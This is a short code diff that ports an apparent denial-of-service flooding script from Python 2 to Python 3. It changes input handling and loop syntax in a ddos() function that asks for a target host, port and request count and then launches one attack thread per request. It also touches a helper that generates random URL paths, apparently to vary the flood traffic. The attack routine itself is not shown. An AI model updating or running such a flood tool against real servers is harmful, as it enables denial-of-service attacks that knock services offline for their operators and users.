@@ -29,7 +29,7 @@ def status():
 
 
 def urli_path():
-    msg = str(string.letters + string.digits + string.punctuation)
+    msg = str(string.ascii_letters + string.digits + string.punctuation)
     data = "".join(random.sample(msg, 5))
     return data
 
@@ -58,9 +58,9 @@ def ddos():
     global ip
     global num_requests
 
-    host = raw_input(using + 'host<( ')
-    port = input(using + 'port<( ')
-    num_requests = input(using + 'requests<( ')
+    host = input(using + 'host<( ')
+    port = int(input(using + 'port<( '))
+    num_requests = int(input(using + 'requests<( '))
 
     try:
         host = str(host).replace("https://", "").replace("http://", "").replace("www.", "")
@@ -74,7 +74,7 @@ def ddos():
 
 
     all_threads = []
-    for i in xrange(num_requests):
+    for i in range(num_requests):
         t1 = threading.Thread(target=attack)
         t1.start()
         all_threads.append(t1)
